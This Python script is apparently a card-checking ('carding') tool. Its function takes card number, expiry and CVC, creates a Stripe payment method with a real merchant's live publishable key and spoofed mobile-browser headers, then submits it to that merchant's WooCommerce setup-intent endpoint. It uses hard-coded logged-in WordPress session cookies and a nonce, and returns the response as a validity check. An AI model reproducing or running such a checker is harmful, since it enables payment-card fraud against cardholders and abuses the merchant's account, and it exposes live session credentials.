import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10008&billing_details[address][country]=US&pasted_fields=number&payment_user_agent=stripe.js%2Fbadb92382f%3B+stripe-js-v3%2Fbadb92382f%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fbespokeutilitydesign.uk&time_on_page=42183&client_attribution_metadata[client_session_id]=e269e1ba-b7ec-41c0-8218-7cf77bf2e589&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=25df001e-edab-493f-af8e-be9643f30ec3&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=NA&muid=NA&sid=NA&key=pk_live_51QjnPV2MjoKV3YuRePNjSPTGO3FHCRCYwZLtGRtRvQRuKVINj96iZlxGdx6jukb5uYQQGWPq04ClZYwIIChOQis9007yEEZqcf&_stripe_version=2024-06-20'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    'wordpress_sec_d54127facf26163901c7742e75741c76': 'waow%7C1771863444%7C6ZSB4QBdwHpKvlMuis1hyYF6HAC6d6pVCrYaoWa90nC%7C67757a50d2eacfe5a98c516fe192afa66852e16b67efca281cee4e22e3f804ed',
	    '_ga': 'GA1.1.1575939560.1770368766',
	    '_gcl_au': '1.1.262757717.1770368766',
	    '__stripe_mid': '549544fc-8682-4fe4-8bdd-a1433c1eb02124a8a6',
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_current_add': 'fd%3D2026-02-21%2015%3A46%3A32%7C%7C%7Cep%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fadd-payment-method%2F',
	    'sbjs_first_add': 'fd%3D2026-02-21%2015%3A46%3A32%7C%7C%7Cep%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fadd-payment-method%2F',
	    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
	    '__stripe_sid': 'b03d8b65-a27c-4b7f-bd70-74e81e9ddc6f54052a',
	    'wordpress_logged_in_d54127facf26163901c7742e75741c76': 'waow%7C1771863444%7C6ZSB4QBdwHpKvlMuis1hyYF6HAC6d6pVCrYaoWa90nC%7C689142f31eb7efac9b38e5b312d3d106b061ffe9966064d039e1909d96555019',
	    '_ga_WVQWTK679F': 'GS2.1.s1771690592$o10$g1$t1771690718$j59$l0$h0',
	    'sbjs_session': 'pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fadd-payment-method%2F',
	}
	
	headers = {
	    'authority': 'bespokeutilitydesign.uk',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': 'wordpress_sec_d54127facf26163901c7742e75741c76=waow%7C1771863444%7C6ZSB4QBdwHpKvlMuis1hyYF6HAC6d6pVCrYaoWa90nC%7C67757a50d2eacfe5a98c516fe192afa66852e16b67efca281cee4e22e3f804ed; _ga=GA1.1.1575939560.1770368766; _gcl_au=1.1.262757717.1770368766; __stripe_mid=549544fc-8682-4fe4-8bdd-a1433c1eb02124a8a6; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-02-21%2015%3A46%3A32%7C%7C%7Cep%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fadd-payment-method%2F; sbjs_first_add=fd%3D2026-02-21%2015%3A46%3A32%7C%7C%7Cep%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fadd-payment-method%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; __stripe_sid=b03d8b65-a27c-4b7f-bd70-74e81e9ddc6f54052a; wordpress_logged_in_d54127facf26163901c7742e75741c76=waow%7C1771863444%7C6ZSB4QBdwHpKvlMuis1hyYF6HAC6d6pVCrYaoWa90nC%7C689142f31eb7efac9b38e5b312d3d106b061ffe9966064d039e1909d96555019; _ga_WVQWTK679F=GS2.1.s1771690592$o10$g1$t1771690718$j59$l0$h0; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fadd-payment-method%2F',
	    'origin': 'https://bespokeutilitydesign.uk',
	    'referer': 'https://bespokeutilitydesign.uk/my-account/add-payment-method/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'action': 'wc_stripe_create_and_confirm_setup_intent',
	    'wc-stripe-payment-method': f'{pm}',
	    'wc-stripe-payment-type': 'card',
	    '_ajax_nonce': '400c9c3ba5',
	}
	
	r2 = requests.post('https://bespokeutilitydesign.uk/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
	
	return (r2.json())
